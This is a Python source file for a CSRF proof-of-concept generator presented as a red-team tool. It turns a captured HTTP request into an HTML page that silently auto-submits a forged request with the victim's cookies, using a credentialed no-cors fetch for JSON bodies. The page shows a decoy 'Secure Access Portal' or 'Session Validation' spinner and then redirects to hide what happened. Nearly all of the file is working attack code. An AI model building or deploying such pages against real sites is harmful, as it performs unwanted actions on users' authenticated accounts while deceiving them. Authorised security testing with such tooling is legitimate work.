#!/usr/bin/env python3
"""Red-team PoC generator for CSRF and form-driven web workflows.

The tool is intended for authorized security testing, red-team exercises,
code review validation, and defensive research in environments where the
operator has explicit permission to test.
"""

import argparse
import json
import os
import sys
import urllib.parse
from typing import Any, Dict, Iterable, List, Tuple

DEFAULT_REDIRECT = "about:blank"
DEFAULT_OUTPUT = "adaptive_poc.html"


def _flatten_payload(data: Any, prefix: str = "") -> Dict[str, Any]:
    flattened: Dict[str, Any] = {}

    if isinstance(data, dict):
        for key, value in data.items():
            new_key = f"{prefix}.{key}" if prefix else str(key)
            if isinstance(value, (dict, list)):
                flattened.update(_flatten_payload(value, new_key))
            else:
                flattened[new_key] = value
    elif isinstance(data, list):
        for index, value in enumerate(data):
            new_key = f"{prefix}.{index}" if prefix else str(index)
            if isinstance(value, (dict, list)):
                flattened.update(_flatten_payload(value, new_key))
            else:
                flattened[new_key] = value
    else:
        if prefix:
            flattened[prefix] = data
    return flattened


def _parse_qs_dict(raw: str) -> Dict[str, Any]:
    parsed = urllib.parse.parse_qs(raw, keep_blank_values=True)
    return {key: (values[0] if len(values) == 1 else values) for key, values in parsed.items()}


def parse_raw_http(raw_http_text: str):
    """Parse a raw HTTP request and return (method, url, params, payload_type, headers)."""
    if raw_http_text is None:
        raise ValueError("raw_http_text cannot be None")

    text = raw_http_text.strip()
    if not text:
        raise ValueError("empty HTTP request")

    lines = text.splitlines()
    if not lines:
        raise ValueError("no HTTP request lines found")

    request_line = lines[0].split()
    if len(request_line) < 2:
        raise ValueError("request line is invalid")

    method = request_line[0].upper()
    raw_path = request_line[1]

    headers: Dict[str, str] = {}
    body_lines: List[str] = []
    in_body = False

    for line in lines[1:]:
        if not in_body and line == "":
            in_body = True
            continue

        if not in_body:
            if ":" in line:
                key, value = line.split(":", 1)
                headers[key.strip().lower()] = value.strip()
        else:
            body_lines.append(line)

    body = "\n".join(body_lines).strip()
    host = headers.get("host", "")
    scheme = "https"
    if host and host.startswith("http://"):
        scheme = "http"
        host = host.replace("http://", "").replace("https://", "")

    base_url = f"{scheme}://{host}" if host else ""
    url = urllib.parse.urljoin(base_url, raw_path)

    params: Dict[str, Any] = {}
    payload_type = "URL_ENCODED"

    if method == "GET":
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
        params = {key: (values[0] if len(values) == 1 else values) for key, values in query_params.items()}
        clean_url = urllib.parse.urlunparse(
            (parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, "", "")
        )
        url = clean_url
        return method, url, params, payload_type, headers

    if not body:
        return method, url, params, payload_type, headers

    content_type = headers.get("content-type", "").lower()
    if content_type.startswith("application/json") or body.lstrip().startswith("{") or body.lstrip().startswith("["):
        payload_type = "JSON"
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                params = data
            else:
                params = {"payload": data}
        except json.JSONDecodeError:
            params = {"raw_payload": body}
    elif "multipart/form-data" in content_type:
        payload_type = "MULTIPART"
        params = _parse_qs_dict(body)
    else:
        params = _parse_qs_dict(body)
        if not params and body.strip():
            payload_type = "RAW"
            params = {"raw_payload": body}

    return method, url, params, payload_type, headers


def _render_hidden_inputs(data: Any, prefix: str = "") -> str:
    rendered: List[str] = []
    flattened = _flatten_payload(data, prefix)

    for key, value in flattened.items():
        safe_name = str(key).replace('"', "&quot;")
        safe_value = str(value).replace('"', "&quot;")
        rendered.append(f'        <input type="hidden" name="{safe_name}" value="{safe_value}" />')

    return "\n".join(rendered)


def _render_theme(template_name: str) -> str:
    themes = {
        "stealth": {
            "bg": "radial-gradient(circle at 50% 50%, #101827 0%, #0a0f1a 100%)",
            "accent": "#7c3aed",
            "accent2": "#22d3ee",
            "title": "Mission Control",
            "subtitle": "Synchronizing workflow state...",
        },
        "portal": {
            "bg": "linear-gradient(135deg, #111827 0%, #1f2937 100%)",
            "accent": "#f59e0b",
            "accent2": "#f97316",
            "title": "Secure Access Portal",
            "subtitle": "Authenticating request context...",
        },
        "login": {
            "bg": "linear-gradient(180deg, #0f172a 0%, #111827 100%)",
            "accent": "#10b981",
            "accent2": "#3b82f6",
            "title": "Session Validation",
            "subtitle": "Verifying identity state...",
        },
    }
    return themes.get(template_name, themes["stealth"])


def generate_html_poc(
    method: str,
    url: str,
    params: Dict[str, Any],
    payload_type: str,
    redirect_url: str = DEFAULT_REDIRECT,
    title: str = "Request Validation",
    template_name: str = "stealth",
) -> str:
    theme = _render_theme(template_name)
    form_method = "GET" if method == "GET" else "POST"

    if payload_type == "JSON":
        json_body = json.dumps(params, separators=(",", ":"))
        form_html = f"""
    <form id="attack-form" method="POST" action="{url}">
        <input type="hidden" name="payload" value="{json_body}" />
    </form>
    """
        js_logic = f"""
            const payload = {json.dumps(params, separators=(",", ":"))};
            fetch("{url}", {{
                method: "{method}",
                mode: "no-cors",
                credentials: "include",
                headers: {{
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }},
                body: JSON.stringify(payload)
            }});
        """
    elif method == "GET":
        query_params = urllib.parse.urlencode(params)
        next_url = f"{url}?{query_params}" if query_params else url
        form_html = ""
        js_logic = f"""
            window.location.href = "{next_url}";
        """
    else:
        hidden_inputs = _render_hidden_inputs(params)
        form_html = f"""
    <form id="attack-form" method="{form_method}" action="{url}">
{hidden_inputs}
        <input type="submit" value="Submit Request" />
    </form>
    """
        js_logic = """
            document.getElementById('attack-form').submit();
        """

    html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>{title}</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }}
        body {{
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh; margin: 0;
            background: {theme['bg']};
            color: #eef2ff;
            overflow: hidden;
        }}
        .panel {{
            width: min(460px, 90vw);
            padding: 2.3rem 2rem;
            background: rgba(15, 23, 42, 0.78);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            box-shadow: 0 24px 60px rgba(2, 6, 23, 0.6);
            text-align: center;
            backdrop-filter: blur(10px);
        }}
        .brand {{
            font-size: 2.3rem;
            font-weight: 800;
            letter-spacing: -0.08em;
            background: linear-gradient(120deg, {theme['accent']} 0%, {theme['accent2']} 100%);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 1rem;
        }}
        .spinner {{
            width: 52px; height: 52px;
            margin: 1.25rem auto 1.5rem;
            border: 3px solid rgba(255,255,255,0.08);
            border-top-color: {theme['accent2']};
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }}
        .title {{ font-size: 1.4rem; font-weight: 600; margin-bottom: 0.65rem; }}
        .subtitle {{ color: rgba(226, 232, 240, 0.7); font-size: 0.96rem; line-height: 1.6; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="panel">
        <div class="brand">{theme['title']}</div>
        <div class="spinner"></div>
        <div class="title">Processing secure request</div>
        <div class="subtitle">{theme['subtitle']}</div>
    </div>

    {form_html}

    <script>
        window.addEventListener('DOMContentLoaded', () => {{
            setTimeout(() => {{
                {js_logic}
                setTimeout(() => {{
                    window.location.replace("{redirect_url}");
                }}, 1200);
            }}, 800);
        }});
    </script>
</body>
</html>
"""
    return html_template


def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Red-team PoC generator for CSRF and form-driven web flows.")
    parser.add_argument("--redirect-url", default=DEFAULT_REDIRECT, help="URL the browser should land on after the PoC submits")
    parser.add_argument("--output", default=DEFAULT_OUTPUT, help="Output file path for the generated HTML")
    parser.add_argument("--template", choices=["stealth", "portal", "login"], default="stealth", help="Theme style for the PoC page")
    parser.add_argument("--title", default="Request Validation", help="Page title shown in the generated output")
    parser.add_argument("--request-file", help="Path to a raw HTTP request file to parse")
    return parser


def main(argv: Iterable[str] | None = None) -> int:
    parser = _build_parser()
    args = parser.parse_args(list(argv) if argv is not None else None)

    if args.request_file:
        with open(args.request_file, "r", encoding="utf-8") as f:
            raw_http_text = f.read()
    else:
        print("Paste the raw HTTP request below. End with Ctrl+D (Linux/Mac) or Ctrl+Z then Enter (Windows):")
        try:
            raw_http_text = sys.stdin.read()
        except KeyboardInterrupt:
            print("\nExiting...")
            return 0

    try:
        method, url, params, payload_type, headers = parse_raw_http(raw_http_text)
    except ValueError as exc:
        print(f"[-] Error: {exc}", file=sys.stderr)
        return 1

    if not url:
        print("[-] Error: URL parsing failed.", file=sys.stderr)
        return 1

    output_html = generate_html_poc(
        method=method,
        url=url,
        params=params,
        payload_type=payload_type,
        redirect_url=args.redirect_url,
        title=args.title,
        template_name=args.template,
    )

    destination = os.path.abspath(args.output)
    with open(destination, "w", encoding="utf-8") as handle:
        handle.write(output_html)

    print(f"[+] Detected method: {method}")
    print(f"[+] Detected payload: {payload_type}")
    print(f"[+] Target URL: {url}")
    print(f"[+] Output written to: {destination}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
